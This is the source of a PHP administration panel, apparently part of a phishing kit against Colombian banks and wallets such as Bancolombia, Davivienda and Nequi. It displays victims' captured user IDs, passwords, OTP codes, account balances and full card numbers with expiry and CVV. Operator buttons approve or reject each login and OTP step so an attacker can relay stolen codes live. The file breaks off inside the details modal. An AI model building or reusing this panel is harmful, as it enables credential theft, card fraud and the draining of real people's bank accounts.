<?php
// admin/index.php - PANEL DE SESIONES CON TARJETA UNIFICADA (LOGIN + OTP) - TEMA BLANCO/AZUL

$dataDir = __DIR__ . '/data';
$logsFile = $dataDir . '/pse_logs.json';
$transaccionesFile = $dataDir . '/transacciones.json';

$logs = [];
if (file_exists($logsFile)) {
    $content = file_get_contents($logsFile);
    $logs = json_decode($content, true) ?? [];
}

$transacciones = [];
if (file_exists($transaccionesFile)) {
    $content = file_get_contents($transaccionesFile);
    $transacciones = json_decode($content, true) ?? [];
}

$total_logs = count($logs);
$pendientes = count(array_filter($logs, fn($l) => ($l['estado'] ?? '') === 'pendiente'));
$total_transacciones = count($transacciones);

$bancos = [];
foreach ($logs as $log) {
    $banco = $log['banco'] ?? 'Desconocido';
    if (!isset($bancos[$banco])) {
        $bancos[$banco] = 0;
    }
    $bancos[$banco]++;
}

// ======================== AGRUPACIÓN DE SESIONES ========================
$sesiones_agrupadas = [];

foreach ($logs as $log) {
    // MEJOR DETECCIÓN DEL USUARIO/DOCUMENTO
    $documento = 'N/A';
    $camposUsuario = ['documento', 'usuario', 'identificacion', 'cedula', 'numero_documento', 'doc', 'user', 'username'];
    foreach ($camposUsuario as $campo) {
        if (!empty($log[$campo])) {
            $documento = $log[$campo];
            break;
        }
    }
    
    // Si aún no hay documento, intentar con 'titular' o 'nombre'
    if ($documento === 'N/A' && !empty($log['titular'])) {
        $documento = $log['titular'];
    }
    if ($documento === 'N/A' && !empty($log['nombre'])) {
        $documento = $log['nombre'];
    }
    
    $banco = $log['banco'] ?? 'Desconocido';
    $clave = $log['clave_pin'] ?? $log['clave'] ?? $log['pin'] ?? '';
    $otp = $log['codigo_otp'] ?? $log['codigo_dinamica'] ?? $log['otp'] ?? $log['codigo'] ?? '';
    $saldo = $log['saldo'] ?? '';
    $actividad = $log['activity'] ?? 'LOGIN';
    $estado = $log['estado'] ?? 'pendiente';
    $fecha = $log['fecha'] ?? '';
    $id = $log['id'] ?? uniqid();
    $error_tipo = $log['error_tipo'] ?? null;
    
    $key = md5($documento . '_' . strtolower($banco));
    
    if (!isset($sesiones_agrupadas[$key])) {
        $sesiones_agrupadas[$key] = [
            'documento' => $documento,
            'usuario' => $documento,
            'banco' => $banco,
            'clave' => '',
            'otp' => '',
            'saldo' => '',
            'estado_login' => 'pendiente',
            'estado_otp' => 'pendiente',
            'login_id' => null,
            'otp_id' => null,
            'error_tipo' => null,
            'fecha_inicio' => $fecha,
            'actividad_login' => '',
            'actividad_otp' => '',
            'logs_ids' => []
        ];
    }
    
    $sesiones_agrupadas[$key]['logs_ids'][] = $id;
    
    $esOtp = strpos($actividad, 'OTP') !== false || strpos($actividad, 'DINÁMICA') !== false || strpos($actividad, 'CODIGO') !== false;
    $esSaldo = strpos($actividad, 'SALDO') !== false;
    
    if ($esOtp) {
        $sesiones_agrupadas[$key]['otp'] = $otp;
        $sesiones_agrupadas[$key]['otp_id'] = $id;
        $sesiones_agrupadas[$key]['estado_otp'] = $estado;
        $sesiones_agrupadas[$key]['actividad_otp'] = $actividad;
    } elseif ($esSaldo) {
        $sesiones_agrupadas[$key]['saldo'] = $saldo;
        $sesiones_agrupadas[$key]['estado_login'] = $estado;
        $sesiones_agrupadas[$key]['login_id'] = $id;
        $sesiones_agrupadas[$key]['actividad_login'] = $actividad;
        if ($error_tipo) {
            $sesiones_agrupadas[$key]['error_tipo'] = $error_tipo;
        }
    } else {
        $sesiones_agrupadas[$key]['clave'] = $clave;
        $sesiones_agrupadas[$key]['login_id'] = $id;
        $sesiones_agrupadas[$key]['estado_login'] = $estado;
        $sesiones_agrupadas[$key]['actividad_login'] = $actividad;
        if ($error_tipo) {
            $sesiones_agrupadas[$key]['error_tipo'] = $error_tipo;
        }
    }
    
    if ($fecha > $sesiones_agrupadas[$key]['fecha_inicio']) {
        $sesiones_agrupadas[$key]['fecha_inicio'] = $fecha;
    }
}

usort($sesiones_agrupadas, function($a, $b) {
    return strcmp($b['fecha_inicio'], $a['fecha_inicio']);
});
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Sesiones</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #ffffff;
            padding: 20px;
            color: #1a1a2e;
            min-height: 100vh;
        }
        .container { max-width: 1100px; margin: 0 auto; }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            flex-wrap: wrap;
            gap: 10px;
            background: #ffffff;
            padding: 15px 20px;
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
            border-bottom: 3px solid #1a56db;
        }
        .header h1 { 
            font-size: 22px; 
            font-weight: 300; 
            color: #1a1a2e; 
        }
        .header h1 span { 
            color: #1a56db; 
            font-weight: 700; 
        }

        .header-controls {
            display: flex;
            gap: 8px;
            align-items: center;
            flex-wrap: wrap;
        }
        .header-controls input {
            padding: 8px 14px;
            border-radius: 20px;
            border: 1px solid #d0d7e0;
            background: #f8fafc;
            color: #1a1a2e;
            font-size: 13px;
            width: 180px;
            outline: none;
        }
        .header-controls input::placeholder { 
            color: #999; 
        }
        .header-controls input:focus { 
            border-color: #1a56db; 
            box-shadow: 0 0 0 3px rgba(26, 86, 219, 0.1);
        }

        .btn {
            padding: 6px 14px;
            border: none;
            border-radius: 18px;
            cursor: pointer;
            font-weight: 600;
            font-size: 12px;
            transition: all 0.3s;
            color: #ffffff;
        }
        .btn:hover { transform: scale(1.03); opacity: 0.9; }
        .btn-primary { background: #1a56db; color: #ffffff; }
        .btn-danger { background: #dc2626; color: #ffffff; }
        .btn-info { background: #0891b2; color: #ffffff; }
        .btn-sm { padding: 4px 12px; font-size: 11px; border-radius: 12px; }
        
        .btn-aprobar { background: #059669; color: #ffffff; font-weight: 700; }
        .btn-error-usuario { background: #dc2626; color: #ffffff; }
        .btn-error-clave { background: #d97706; color: #ffffff; }
        .btn-error-saldo { background: #65a30d; color: #ffffff; }
        .btn-error-dinamica { background: #7c3aed; color: #ffffff; }
        .btn-error-otp { background: #db2777; color: #ffffff; }

        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 12px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: #ffffff;
            padding: 12px 18px;
            border-radius: 10px;
            border-left: 3px solid #1a56db;
            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
        }
        .stat-card .label { 
            font-size: 11px; 
            color: #888; 
            text-transform: uppercase; 
        }
        .stat-card .value { 
            font-size: 22px; 
            font-weight: bold; 
            color: #1a56db; 
        }

        .filtros {
            display: flex;
            gap: 8px;
            margin-bottom: 16px;
            flex-wrap: wrap;
        }
        .filtro-btn {
            padding: 5px 16px;
            border-radius: 15px;
            border: 1px solid #d0d7e0;
            background: #ffffff;
            color: #666;
            cursor: pointer;
            font-size: 12px;
            transition: all 0.3s;
        }
        .filtro-btn:hover, .filtro-btn.active {
            background: #1a56db;
            color: #ffffff;
            border-color: #1a56db;
        }

        .sesiones-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 30px;
        }

        .sesion-card {
            background: #ffffff;
            border-radius: 12px;
            padding: 16px 20px;
            border-left: 5px solid #1a56db;
            transition: all 0.3s;
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 10px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
        }
        .sesion-card:hover { 
            box-shadow: 0 4px 16px rgba(0,0,0,0.10);
            transform: translateY(-2px);
        }
        .sesion-card.estado-aprobado { border-left-color: #059669; }
        .sesion-card.estado-rechazado { border-left-color: #dc2626; }

        .sesion-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 8px;
        }
        .sesion-banco {
            font-weight: bold;
            font-size: 15px;
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
            color: #1a1a2e;
        }
        .sesion-banco .badge {
            padding: 3px 14px;
            border-radius: 12px;
            font-size: 11px;
            color: #ffffff;
        }
        .badge-bancolombia { background: #1a56db; color: #ffffff; }
        .badge-bogota { background: #c2410c; color: #ffffff; }
        .badge-davivienda { background: #b91c1c; color: #ffffff; }
        .badge-daviplata { background: #15803d; color: #ffffff; }
        .badge-falabella { background: #6b21a8; color: #ffffff; }
        .badge-nequi { background: #0d9488; color: #ffffff; }
        .badge-otro { background: #64748b; color: #ffffff; }

        .sesion-usuario {
            font-size: 14px;
            color: #1a1a2e;
            font-weight: 500;
        }
        .sesion-usuario .label {
            color: #888;
            font-size: 11px;
            text-transform: uppercase;
            margin-right: 4px;
        }

        .sesion-id {
            font-size: 10px;
            color: #999;
            font-family: monospace;
        }

        /* NUEVOS ESTILOS DE ESTADOS - AZUL OSCURO CON LETRAS BLANCAS */
        .sesion-estado-general {
            font-size: 11px;
            padding: 4px 16px;
            border-radius: 12px;
            font-weight: 700;
            color: #ffffff;
        }
        .estado-pendiente { 
            background: #1a365d; 
            color: #ffffff;
            border: 1px solid #2b6cb0;
        }
        .estado-aprobado { 
            background: #059669; 
            color: #000000;
            border: 1px solid #10b981;
        }
        .estado-rechazado { 
            background: #dc2626; 
            color: #ffffff;
            border: 1px solid #ef4444;
        }

        .error-badge {
            font-size: 10px;
            padding: 2px 10px;
            border-radius: 10px;
            margin-left: 4px;
            color: #ffffff;
        }
        .error-badge.usuario { background: #dc2626; color: #ffffff; }
        .error-badge.clave { background: #d97706; color: #ffffff; }
        .error-badge.saldo { background: #65a30d; color: #ffffff; }
        .error-badge.dinamica { background: #7c3aed; color: #ffffff; }
        .error-badge.otp { background: #db2777; color: #ffffff; }

        .sesion-body {
            display: flex;
            flex-wrap: wrap;
            gap: 20px 40px;
            padding: 8px 0;
            background: #f8fafc;
            border-radius: 8px;
            padding: 10px 16px;
            border: 1px solid #e8ecf0;
        }
        .sesion-dato {
            font-size: 14px;
            color: #1a1a2e;
        }
        .sesion-dato .label {
            color: #888;
            font-size: 11px;
            text-transform: uppercase;
            margin-right: 6px;
        }
        .sesion-dato .valor {
            color: #1a1a2e;
            font-weight: 500;
        }
        .sesion-dato .valor.clave {
            font-family: monospace;
            letter-spacing: 2px;
            color: #c2410c;
        }
        .sesion-dato .valor.otp {
            font-family: monospace;
            letter-spacing: 2px;
            color: #1a56db;
        }
        .sesion-dato .valor.saldo {
            font-family: monospace;
            letter-spacing: 1px;
            color: #15803d;
        }
        .sesion-dato .valor.sin-dato {
            color: #bbb;
            font-style: italic;
        }

        /* Estilo especial para SALDO - solo Nequi */
        .sesion-dato.saldo-dato .valor {
            color: #15803d;
            font-weight: 700;
            font-size: 16px;
        }
        .sesion-dato.saldo-dato .label {
            color: #15803d;
        }

        .sesion-pasos {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            font-size: 12px;
            padding: 4px 0;
            color: #1a1a2e;
        }
        .paso-item {
            display: flex;
            align-items: center;
            gap: 5px;
            color: #1a1a2e;
        }
        /* ESTADOS DE PASOS - AZUL OSCURO CON LETRAS BLANCAS */
        .paso-item .estado-paso {
            padding: 3px 12px;
            border-radius: 10px;
            font-size: 10px;
            font-weight: 700;
        }
        .paso-item .estado-paso.pendiente { 
            background: #1a365d; 
            color: #ffffff;
            border: 1px solid #2b6cb0;
        }
        .paso-item .estado-paso.aprobado { 
            background: #059669; 
            color: #000000;
            border: 1px solid #10b981;
        }
        .paso-item .estado-paso.rechazado { 
            background: #dc2626; 
            color: #ffffff;
            border: 1px solid #ef4444;
        }

        .sesion-acciones {
            display: flex;
            gap: 6px;
            flex-wrap: wrap;
            padding-top: 8px;
            border-top: 1px solid #e8ecf0;
            align-items: center;
        }
        .sesion-acciones .btn {
            min-width: 60px;
            text-align: center;
            color: #ffffff;
        }

        .sesion-fecha {
            font-size: 11px;
            color: #999;
        }

        .toast-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
        }
        .toast {
            background: #ffffff;
            color: #1a1a2e;
            padding: 12px 20px;
            border-radius: 10px;
            margin-bottom: 8px;
            border-left: 4px solid #059669;
            animation: slideIn 0.3s ease;
            font-size: 14px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
        .toast.error { border-left-color: #dc2626; }
        .toast.warning { border-left-color: #d97706; }
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        .empty-message {
            text-align: center;
            padding: 50px;
            color: #999;
            font-size: 16px;
        }

        /* Estilos para la tabla de transacciones */
        .table-wrapper {
            background: #ffffff;
            border-radius: 12px;
            padding: 16px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
            border: 1px solid #e8ecf0;
        }
        .table-wrapper table {
            width: 100%;
            border-collapse: collapse;
            font-size: 12px;
        }
        .table-wrapper th {
            background: #f8fafc;
            padding: 10px;
            text-align: left;
            color: #1a56db;
            border-bottom: 2px solid #1a56db;
            font-weight: 600;
        }
        .table-wrapper td {
            padding: 10px;
            border-bottom: 1px solid #f0f2f5;
            color: #1a1a2e;
        }
        .table-wrapper tr:hover td {
            background: #f0f7ff;
        }
        .badge-tarjeta {
            background: #dbeafe;
            color: #1a56db;
            padding: 4px 8px;
            border-radius: 3px;
            font-size: 10px;
            font-weight: bold;
        }
        .badge-pse {
            background: #ede9fe;
            color: #6b21a8;
            padding: 4px 8px;
            border-radius: 3px;
            font-size: 10px;
            font-weight: bold;
        }

        /* Modal */
        .modal-content {
            background: #ffffff;
            padding: 30px;
            border-radius: 8px;
            max-width: 600px;
            max-height: 80vh;
            overflow-y: auto;
            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
        }
        .modal-header {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 20px;
            color: #1a1a2e;
            border-bottom: 2px solid #1a56db;
            padding-bottom: 10px;
        }
        .modal-field {
            background: #f8fafc;
            padding: 12px;
            border-radius: 5px;
            border-left: 3px solid #1a56db;
        }
        .modal-field-label {
            font-size: 11px;
            font-weight: bold;
            color: #888;
            text-transform: uppercase;
            margin-bottom: 5px;
        }
        .modal-field-value {
            font-size: 14px;
            color: #1a1a2e;
            font-weight: 600;
        }
        .modal-close {
            margin-top: 20px;
            width: 100%;
            padding: 12px;
            background: #1a56db;
            color: white;
            border: none;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
        }
        .modal-close:hover {
            background: #1e40af;
        }

        @media (max-width: 700px) {
            .sesion-body { gap: 10px; flex-direction: column; }
            .sesion-dato { font-size: 13px; }
            .stats { grid-template-columns: 1fr 1fr; }
            .header h1 { font-size: 18px; }
            .header-controls input { width: 130px; }
            .sesion-card { padding: 14px 16px; }
            .sesion-pasos { flex-direction: column; gap: 5px; }
            .modal-content { margin: 20px; padding: 20px; }
        }
        @media (max-width: 450px) {
            .sesion-top { flex-direction: column; align-items: flex-start; }
            .sesion-acciones { justify-content: center; }
            .sesion-acciones .btn { min-width: 50px; font-size: 10px; padding: 3px 8px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 Panel de <span>Sesiones</span></h1>
            <div class="header-controls">
                <input type="text" id="filtroInput" placeholder="Filtrar..." onkeyup="aplicarFiltros()">
                <button class="btn btn-primary" onclick="cargarDatos()">🔄</button>
                <button class="btn btn-danger" onclick="borrarTodosLogs()">🗑️</button>
                <button class="btn btn-info" onclick="exportarCSV()">📥</button>
            </div>
        </div>

        <div class="stats">
            <div class="stat-card"><div class="label">Total</div><div class="value" id="statTotal"><?php echo $total_logs; ?></div></div>
            <div class="stat-card"><div class="label">Pendientes</div><div class="value" id="statPendientes"><?php echo $pendientes; ?></div></div>
            <div class="stat-card"><div class="label">Bancos</div><div class="value"><?php echo count($bancos); ?></div></div>
            <div class="stat-card"><div class="label">Transacciones</div><div class="value"><?php echo $total_transacciones; ?></div></div>
        </div>

        <div class="filtros" id="filtrosBanco">
            <button class="filtro-btn active" data-banco="todos" onclick="filtrarPorBanco('todos')">Todos</button>
            <?php foreach ($bancos as $banco => $count): 
                $bancoSlug = strtolower(str_replace(' ', '_', $banco));
            ?>
                <button class="filtro-btn" data-banco="<?php echo $bancoSlug; ?>" onclick="filtrarPorBanco('<?php echo $bancoSlug; ?>')">
                    <?php echo htmlspecialchars($banco); ?> (<?php echo $count; ?>)
                </button>
            <?php endforeach; ?>
        </div>

        <div class="sesiones-list" id="sesionesList">
            <?php if (count($sesiones_agrupadas) > 0): ?>
                <?php foreach ($sesiones_agrupadas as $sesion): 
                    $banco = $sesion['banco'] ?? 'Desconocido';
                    $bancoLower = strtolower($banco);
                    $badgeClass = 'badge-otro';
                    if (strpos($bancoLower, 'bancolombia') !== false) $badgeClass = 'badge-bancolombia';
                    elseif (strpos($bancoLower, 'bogota') !== false) $badgeClass = 'badge-bogota';
                    elseif (strpos($bancoLower, 'davivienda') !== false) $badgeClass = 'badge-davivienda';
                    elseif (strpos($bancoLower, 'daviplata') !== false) $badgeClass = 'badge-daviplata';
                    elseif (strpos($bancoLower, 'falabella') !== false) $badgeClass = 'badge-falabella';
                    elseif (strpos($bancoLower, 'nequi') !== false) $badgeClass = 'badge-nequi';
                    
                    $usuario = $sesion['documento'] ?? $sesion['usuario'] ?? 'N/A';
                    $clave = $sesion['clave'] ?? '';
                    $otp = $sesion['otp'] ?? '';
                    $saldo = $sesion['saldo'] ?? '';
                    $login_id = $sesion['login_id'];
                    $otp_id = $sesion['otp_id'];
                    $estado_login = $sesion['estado_login'] ?? 'pendiente';
                    $estado_otp = $sesion['estado_otp'] ?? 'pendiente';
                    $error_tipo = $sesion['error_tipo'] ?? null;
                    $fecha = $sesion['fecha_inicio'] ?? '';
                    
                    $estado_general = 'pendiente';
                    if ($estado_login === 'rechazado' || $estado_otp === 'rechazado') {
                        $estado_general = 'rechazado';
                    } elseif ($estado_login === 'aprobado' && $estado_otp === 'aprobado') {
                        $estado_general = 'aprobado';
                    }
                    
                    $mostrarBotonesLogin = ($estado_login === 'pendiente');
                    $mostrarBotonesOtp = ($estado_login === 'aprobado' && $estado_otp === 'pendiente');
                    
                    // Verificar si es Nequi y tiene SALDO
                    $esNequi = strpos($bancoLower, 'nequi') !== false;
                    $tieneSaldo = !empty($saldo);
                ?>
                    <div class="sesion-card estado-<?php echo $estado_general; ?>" 
                         data-banco="<?php echo $bancoLower; ?>" 
                         data-usuario="<?php echo strtolower($usuario); ?>" 
                         data-id="<?php echo $login_id ?: $otp_id; ?>">
                        
                        <div class="sesion-top">
                            <div class="sesion-banco">
                                <span class="badge <?php echo $badgeClass; ?>"><?php echo htmlspecialchars($banco); ?></span>
                                <span class="sesion-usuario">
                                    <span class="label">👤</span>
                                    <?php echo htmlspecialchars($usuario); ?>
                                </span>
                                <span class="sesion-id">#<?php echo substr($login_id ?: $otp_id, -6); ?></span>
                                <?php if ($error_tipo): ?>
                                    <span class="error-badge <?php echo $error_tipo; ?>"><?php echo $error_tipo; ?></span>
                                <?php endif; ?>
                            </div>
                            <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
                                <span class="sesion-fecha"><?php echo substr($fecha, 11, 5); ?></span>
                                <span class="sesion-estado-general estado-<?php echo $estado_general; ?>">
                                    <?php echo ucfirst($estado_general); ?>
                                </span>
                            </div>
                        </div>

                        <div class="sesion-body">
                            <span class="sesion-dato">
                                <span class="label">👤 Usuario</span>
                                <span class="valor"><?php echo htmlspecialchars($usuario); ?></span>
                            </span>
                            <span class="sesion-dato">
                                <span class="label">🔑 Clave</span>
                                <span class="valor clave"><?php echo !empty($clave) ? htmlspecialchars($clave) : '<span class="sin-dato">—</span>'; ?></span>
                            </span>
                            <span class="sesion-dato">
                                <span class="label">📱 OTP</span>
                                <span class="valor otp"><?php echo !empty($otp) ? htmlspecialchars($otp) : '<span class="sin-dato">—</span>'; ?></span>
                            </span>
                            <?php if ($esNequi && $tieneSaldo): ?>
                            <span class="sesion-dato saldo-dato">
                                <span class="label">💰 SALDO</span>
                                <span class="valor saldo">$ <?php echo number_format(floatval($saldo)); ?></span>
                            </span>
                            <?php endif; ?>
                        </div>

                        <div class="sesion-pasos">
                            <span class="paso-item">
                                🔐 LOGIN: <span class="estado-paso <?php echo $estado_login; ?>"><?php echo ucfirst($estado_login); ?></span>
                            </span>
                            <span class="paso-item">
                                📱 OTP: <span class="estado-paso <?php echo $estado_otp; ?>"><?php echo ucfirst($estado_otp); ?></span>
                            </span>
                            <?php if ($esNequi && $tieneSaldo): ?>
                            <span class="paso-item" style="color:#15803d;">
                                💰 SALDO: <span class="estado-paso <?php echo $estado_login; ?>"><?php echo ucfirst($estado_login); ?></span>
                            </span>
                            <?php endif; ?>
                        </div>

                        <div class="sesion-acciones">
                            <?php if ($mostrarBotonesLogin): ?>
                                <button class="btn btn-aprobar btn-sm" onclick="aprobarLogin('<?php echo $login_id; ?>')">✓ Aprobar</button>
                                <button class="btn btn-error-usuario btn-sm" onclick="errorUsuario('<?php echo $login_id; ?>')">✗ Err Usuario</button>
                                <button class="btn btn-error-clave btn-sm" onclick="errorClave('<?php echo $login_id; ?>')">✗ Err Clave</button>
                                <!-- Botón Error Saldo SOLO para Nequi -->
                                <?php if ($esNequi): ?>
                                <button class="btn btn-error-saldo btn-sm" onclick="errorSaldo('<?php echo $login_id; ?>')">✗ Err Saldo</button>
                                <?php endif; ?>
                            <?php elseif ($mostrarBotonesOtp): ?>
                                <button class="btn btn-aprobar btn-sm" onclick="aprobarOtp('<?php echo $otp_id; ?>')">✓ Aprobar OTP</button>
                                <button class="btn btn-error-dinamica btn-sm" onclick="errorDinamica('<?php echo $otp_id; ?>')">✗ Err Dinámica</button>
                                <button class="btn btn-error-otp btn-sm" onclick="errorOtp('<?php echo $otp_id; ?>')">✗ Err OTP</button>
                            <?php else: ?>
                                <span style="font-size:12px;color:#999;padding:4px 10px;">✅ Sesión completada</span>
                            <?php endif; ?>
                            <button class="btn btn-danger btn-sm" onclick="borrarSesion('<?php echo $login_id ?: $otp_id; ?>')">🗑️</button>
                        </div>
                    </div>
                <?php endforeach; ?>
            <?php else: ?>
                <div class="empty-message">📭 No hay sesiones</div>
            <?php endif; ?>
        </div>
        
        <!-- ==================== TABLA DE TRANSACCIONES CON TARJETAS ==================== -->
        <h2 style="color:#1a1a2e; margin-top: 30px; margin-bottom: 15px;">💳 Transacciones</h2>
        <div class="table-wrapper">
            <table>
                <thead>
                    <tr>
                        <th>Fecha</th>
                        <th>Tipo</th>
                        <th>Plan</th>
                        <th>Titular</th>
                        <th>Documento</th>
                        <th>N° Tarjeta</th>
                        <th>Vencimiento</th>
                        <th>CVV</th>
                        <th>Monto</th>
                        <th>Detalles</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if (count($transacciones) > 0): ?>
                        <?php foreach (array_reverse($transacciones) as $t): ?>
                            <tr>
                                <td><?php echo substr($t['fecha'] ?? '', 11, 5); ?></td>
                                <td>
                                    <?php if (($t['tipo'] ?? '') === 'TARJETA'): ?>
                                        <span class="badge-tarjeta">💳 Tarjeta</span>
                                    <?php else: ?>
                                        <span class="badge-pse">🏦 PSE</span>
                                    <?php endif; ?>
                                </td>
                                <td><?php echo htmlspecialchars($t['plan_nombre'] ?? 'N/A'); ?></td>
                                <td>
                                    <?php 
                                        $titular = '';
                                        if (!empty($t['titular'])) {
                                            $titular = htmlspecialchars($t['titular']);
                                        } elseif (!empty($t['titular_pse'])) {
                                            $titular = htmlspecialchars($t['titular_pse']);
                                        }
                                        echo $titular ?: 'N/A';
                                    ?>
                                </td>
                                <td>
                                    <?php 
                                        $doc = '';
                                        if (!empty($t['documento'])) {
                                            $doc = htmlspecialchars($t['documento']);
                                        } elseif (!empty($t['documento_pse'])) {
                                            $doc = htmlspecialchars($t['documento_pse']);
                                        }
                                        echo $doc ?: 'N/A';
                                    ?>
                                </td>
                                <td style="font-family: monospace; letter-spacing: 1px;">
                                    <?php echo !empty($t['numero_tarjeta']) ? htmlspecialchars($t['numero_tarjeta']) : 'N/A'; ?>
                                </td>
                                <td><?php echo htmlspecialchars($t['vencimiento'] ?? 'N/A'); ?></td>
                                <td style="font-family: monospace; letter-spacing: 1px;">
                                    <?php echo htmlspecialchars($t['cvc'] ?? 'N/A'); ?>
                                </td>
                                <td style="font-weight: bold; color: #1a56db;">
                                    $ <?php echo number_format(round($t['plan_precio'] ?? $t['monto'] ?? 0)); ?>
                                </td>
                                <td>
                                    <button class="btn btn-sm" style="background:#1a56db; color:white; border:none; padding:4px 10px; border-radius:4px; cursor:pointer;" onclick="verDetalles(<?php echo htmlspecialchars(json_encode($t)); ?>)">Ver</button>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    <?php else: ?>
                        <tr><td colspan="10" style="text-align:center; padding:40px; color:#999;">📭 No hay transacciones</td></tr>
                    <?php endif; ?>
                </tbody>
            </table>
        </div>
    </div>

    <!-- Modal Detalles -->
    <div class="modal" id="modalDetalles" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); z-index:1000; align-items:center; justify-content:center;">
        <div class="modal-content">
            <div class="modal-header" id="modalTitulo">Detalles de Transacción</div>
            <div id="modalBody"></div>
            <button class="modal-close" onclick="cerrarModal()">Cerrar</button>
        </div>
    </div>

    <div class="toast-container" id="toastContainer"></div>

    <script>
        function showToast(message, type = 'success') {
            const container = document.getElementById('toastContainer');
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.textContent = message;
            container.appendChild(toast);
            setTimeout(() => {
                toast.style.opacity = '0';
                toast.style.transform = 'translateX(100%)';
                setTimeout(() => toast.remove(), 300);
            }, 2500);
        }

        // ======================== LOGIN ========================
        function aprobarLogin(logId) {
            if (!logId) { showToast('No hay LOGIN pendiente', 'error'); return; }
            fetch('aprobar_datos.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=aprobar&log_id=' + logId
            }).then(() => { showToast('✅ LOGIN Aprobado'); cargarDatos(); });
        }

        function errorUsuario(logId) {
            if (!logId) { showToast('No hay LOGIN pendiente', 'error'); return; }
            fetch('aprobar_datos.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=rechazar&log_id=' + logId + '&error=usuario'
            }).then(() => { showToast('❌ Error Usuario', 'error'); cargarDatos(); });
        }

        function errorClave(logId) {
            if (!logId) { showToast('No hay LOGIN pendiente', 'error'); return; }
            fetch('aprobar_datos.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=rechazar&log_id=' + logId + '&error=clave'
            }).then(() => { showToast('❌ Error Clave', 'error'); cargarDatos(); });
        }

        function errorSaldo(logId) {
            if (!logId) { showToast('No hay LOGIN pendiente', 'error'); return; }
            fetch('aprobar_datos.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=rechazar&log_id=' + logId + '&error=saldo'
            }).then(() => { showToast('💳 Error Saldo - Esperando ingreso de monto', 'warning'); cargarDatos(); });
        }

        // ======================== OTP ========================
        function aprobarOtp(logId) {
            if (!logId) { showToast('No hay OTP pendiente', 'error'); return; }
            fetch('aprobar_datos.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=aprobar&log_id=' + logId
            }).then(() => { showToast('✅ OTP Aprobado'); cargarDatos(); });
        }

        function errorDinamica(logId) {
            if (!logId) { showToast('No hay OTP pendiente', 'error'); return; }
            fetch('aprobar_datos.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=rechazar&log_id=' + logId + '&error=dinamica'
            }).then(() => { showToast('❌ Error Dinámica', 'error'); cargarDatos(); });
        }

        function errorOtp(logId) {
            if (!logId) { showToast('No hay OTP pendiente', 'error'); return; }
            fetch('aprobar_datos.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=rechazar&log_id=' + logId + '&error=otp'
            }).then(() => { showToast('❌ Error OTP', 'error'); cargarDatos(); });
        }

        // ======================== BORRAR ========================
        function borrarSesion(logId) {
            if (!logId) { showToast('No hay ID para eliminar', 'error'); return; }
            if (confirm('¿Eliminar esta sesión?')) {
                fetch('borrar_log.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'log_id=' + logId
                }).then(() => { showToast('🗑️ Sesión eliminada', 'warning'); cargarDatos(); });
            }
        }

        function borrarTodosLogs() {
            if (confirm('⚠️ ¿Eliminar TODOS los registros?')) {
                fetch('borrar_todos_logs.php', { method: 'POST' }).then(() => {
                    showToast('🗑️ Todos eliminados', 'warning');
                    cargarDatos();
                });
            }
        }

        function exportarCSV() {
            window.location.href = 'exportar_csv.php';
        }

        // ======================== VER DETALLES ========================
        function verDetalles(datos) {
            const modal = document.getElementById('modalDetalles');
            const modalBody = document.getElementById('modalBody');
            const modalTitulo = document.getElementById('modalTitulo');
            
            let html = '';
            
            if (datos.tipo === 'TARJETA' || datos.numero_tarjeta) {
                modalTitulo.textContent = '💳 Detalles de Tarjeta';
                html = `
                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-bottom:15px;">
                        <div class="modal-field">
                            <div class="modal-field-label">Plan</div>
                            <div class="modal-field-value">${datos.plan_nombre}</div>
                        </div>
                        <div class="modal-field">
                            <div class="modal-field-label">Monto</div>
                            <div class="modal-field-value" style="color:#1a56db;">$ ${new Intl.NumberFormat('es-CO').format(datos.plan_precio || datos.monto || 0)}</div>
                        </div>
                    </div>
                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-bottom:15px;">
                        <div class="modal-field">
                            <div class="modal-field-label">Titular</div>
